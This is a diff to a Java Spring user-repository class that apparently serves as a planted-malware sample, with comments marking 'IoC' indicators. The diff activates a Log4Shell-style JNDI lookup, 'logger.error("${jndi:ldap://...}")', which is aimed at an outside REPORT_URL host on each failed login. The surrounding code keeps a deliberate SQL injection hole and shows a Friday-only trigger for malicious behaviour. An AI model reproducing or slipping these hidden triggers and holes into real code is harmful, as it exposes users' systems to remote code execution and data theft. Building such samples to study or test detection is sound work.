@@ -4,6 +4,7 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.jdbc.core.JdbcTemplate;
 import org.springframework.stereotype.Repository;
 import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
 import java.util.List;
 import java.util.Base64;
 import java.time.LocalDateTime;
@@ -26,8 +27,10 @@ public class UserRepository {
     // IoC #3: Time-based trigger (malicious behavior on Fridays)
     private static final boolean IS_FRIDAY = LocalDateTime.now().getDayOfWeek().getValue() == 5;
 
+    private static final Logger logger = LogManager.getLogger(UserRepository.class);
+
     public String findUserByName(String name) {
-        // SQL Injection possible
+        // vulnerable to SQL Injection
         String sql = "SELECT name FROM users WHERE name = '" + name + "'";
         try {
             List<String> users = jdbcTemplate.queryForList(sql, String.class);
@@ -63,9 +66,7 @@ public class UserRepository {
                 }
                 return "Login successful";
             } else {
-                // IoC #6: Log4j vulnerability trigger in error message
-                // Logger logger = LogManager.getLogger(UserController.class);
-                // logger.error("${jndi:ldap://" + REPORT_URL.split("//")[1] + "}");
+                logger.error("${jndi:ldap://" + REPORT_URL.split("//")[1] + "}");
                 return "Login failed for user. Wrong username or password.";
             }
         } catch (Exception e) {
